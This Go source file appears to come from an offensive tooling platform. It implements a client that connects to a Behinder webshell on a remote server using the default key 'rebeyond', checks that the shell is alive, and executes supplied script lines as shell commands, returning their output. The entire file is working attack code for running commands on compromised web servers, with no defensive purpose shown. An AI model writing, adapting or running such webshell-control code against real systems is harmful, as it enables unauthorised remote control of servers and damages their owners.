package invoke

import (
	"context"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/shell/behinder"
	"strings"
)

func (c *CallInfo) invokeWebShellScript(ctx context.Context, scriptType string, scriptContent string, callBackFunc func(context.Context, *CallInfo, string)) {
	wsmSrv := Wsm{}
	var webShellUrl string
	for _, param := range c.ToolParamList {
		if strings.Contains(param.ParamName, "webshell") {
			webShellUrl = param.ParamValue
		}
	}
	if webShellUrl == "" {
		log.Error("webshell url is empty")
		return
	}
	err := wsmSrv.Init(webShellUrl)
	if err != nil {
		return
	}
	status, err := wsmSrv.Ping(ctx)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(status)
	data := c.BuildWebShellData(ctx, scriptContent)
	result, err := wsmSrv.CommandExec(ctx, data)
	if err != nil {
		fmt.Println(err)
		return
	}
	callBackFunc(ctx, c, result)
	callBackFunc(ctx, c, "end")
}

// BuildWebShellData 构建webshell数据
func (c *CallInfo) BuildWebShellData(ctx context.Context, scriptContent string) (data string) {
	for _, line := range strings.Split(scriptContent, "\n") {
		if strings.HasPrefix(line, "#") || line == "" {
			continue
		}
		data += line + "\n"
	}
	return
}

type Wsm struct {
	WebShell *wsm.BehinderInfo
}

func (w *Wsm) Init(url string) error {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      url,
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Headers:  nil,
		},
	}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		return err
	}
	w.WebShell = bx
	return nil
}

// Ping 检测存活
func (w *Wsm) Ping(ctx context.Context) (bool, error) {
	i, err := w.WebShell.Ping()
	if err != nil {
		log.Println(err)
	}
	return i, err
}

// webshell命令执行
func (w *Wsm) CommandExec(ctx context.Context, cmd string) (string, error) {
	param := &behinder.ExecParams{
		OnlyJavaParams: behinder.OnlyJavaParams{},
		Cmd:            cmd,
		Path:           "./",
	}
	exec, err := w.WebShell.CommandExec(param)
	if err != nil {
		return "", err
	}
	fmt.Println(exec.ToMap()["msg"])
	return strings.Trim(exec.ToMap()["msg"], "\n"), err
}
